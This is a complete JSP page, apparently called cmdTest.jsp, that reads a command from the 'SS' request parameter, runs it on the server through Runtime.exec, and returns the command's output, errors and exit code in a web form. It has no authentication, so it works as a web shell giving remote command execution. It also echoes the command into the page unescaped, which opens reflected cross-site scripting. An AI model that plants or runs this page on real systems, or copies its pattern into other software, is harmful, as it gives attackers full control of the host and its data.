<%@ page contentType = "text/html;charset=UTF-8"%>
<%@ page import="java.io.*" %>
<%@ page import="java.util.*" %>
<%!
    private static final int BUFFER_SIZE = 512;

    class StreamPumper extends Thread {
        private Reader in;
        private boolean endOfStream = false;
        private int SLEEP_TIME = 5;
        private StringBuffer logStr = null;

        public StreamPumper(InputStream is, StringBuffer str) throws UnsupportedEncodingException{
//	    	in = new InputStreamReader(is,"GBK");
	    	in = new InputStreamReader(is);
            logStr = str;
        }

        public void pumpStream() throws IOException {
            char[] buf = new char[BUFFER_SIZE];

            if (endOfStream == false) {
				int data = in.read(buf,0,BUFFER_SIZE);

				if (data != -1) {
					logStr.append(new String (buf, 0, data));
				} else {
            	    endOfStream = true;
    	        }
            }
        }

        public void run() {
            try {
                try {
                    while (endOfStream == false) {
                        pumpStream();
                        sleep(SLEEP_TIME);
                    }
                } catch (InterruptedException ie) {}
                in.close();
            } catch (IOException ioe) {}
        }
    }
%>
<%
	String result = "";
	String btn = request.getParameter("Button");
	String cmd = request.getParameter("SS");

	StringBuffer outlog = new StringBuffer();
	StringBuffer errlog = new StringBuffer();

	if (btn != null && cmd != null) {
		Runtime r = Runtime.getRuntime();
		Process proc = r.exec(cmd);

		StreamPumper inputPumper = new StreamPumper(proc.getInputStream(), outlog);
        StreamPumper errorPumper = new StreamPumper(proc.getErrorStream(), errlog);

		inputPumper.start();
		errorPumper.start();

		// Wait for everything to finish
		proc.waitFor();
		inputPumper.join();
		errorPumper.join();
		proc.destroy();

		result += proc.exitValue();
	}
%>
<form method=post action="cmdTest.jsp">
  <input type=text name=SS value="<%= cmd %>" size=80>
  <input type=submit name=Button value=OK>
</form>
<pre>
CMD:	<%= cmd %>
Result:
<%= result %>
Output:
<%= outlog %>
Error:
<%= errlog %>
</pre>